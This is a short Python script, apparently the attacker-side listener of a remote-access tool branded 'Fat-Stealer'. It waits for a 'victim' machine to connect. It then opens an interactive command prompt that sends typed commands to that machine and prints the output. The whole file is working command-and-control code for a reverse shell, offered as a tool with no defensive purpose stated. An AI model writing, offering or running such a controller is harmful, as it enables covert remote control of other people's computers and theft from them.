# Requeried modules
import socket

IP = ("127.0.0.1")
PORT = 8080

server = socket.socket()
server.bind((IP,PORT)) # Ip and port, it has to match with the client one
server.listen(1)

while True:
    print("""
        ______      __        _____ __             __         
       / ____/___ _/ /_      / ___// /____  ____ _/ /__  _____
      /   /_  / __ `/ __/_____\__ \/ __/ _ \/ __ `/ / _ \/ ___/
     / __/ / /_/ / /_/_____/__/ / /_/  __/ /_/ / /  __/ /    
    /_/    \__,_/\__/     /____/\__/\___/\__,_/_/\___/_/     

                    [@] Coded by JetBerri

        """
        )

    print("\nWaiting for incoming connection...")

        # Connection
    victim,dir = server.accept()
    print("\n[+] Conexion established from : {}".format(dir))
    binary = victim.recv(1024)
    cod = binary.decode("ascii")

    # Shell available for sending commands
    if cod == "1":
        while True:
            op = input("Jet@cmd >>  ")
            victim.send(op.encode("ascii"))
            result = victim.recv(2048)
            print(result)
        
    else:
        print("[-] An error has occured.")